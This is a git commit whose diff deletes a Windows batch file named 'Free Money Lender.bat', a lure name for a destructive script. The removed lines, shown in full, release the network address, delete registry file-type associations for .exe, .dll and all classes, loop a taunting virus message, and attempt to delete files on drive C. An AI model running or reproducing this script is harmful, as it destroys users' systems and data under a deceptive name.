ebb066e078f9733b4c0120b05ce7d2ba80be9be7
Coder DO as Impossible <95419810+SNV-008@users.noreply.github.com>
2022-05-23 12:57:26 +0530

    Delete Free Money Lender.bat

--- Free Money Lender.bat
+++
@@ -1,9 +0,0 @@
-@Echo off
-Ipconfig /release
-START reg delete HKCR/.exe
-START reg delete HKCR/.dll
-START reg delete HKCR/*
-:MESSAGE
-ECHO Hahaha your pc has been attacked by virus
-GOTO MESSAGE
-Del C: *.* |y
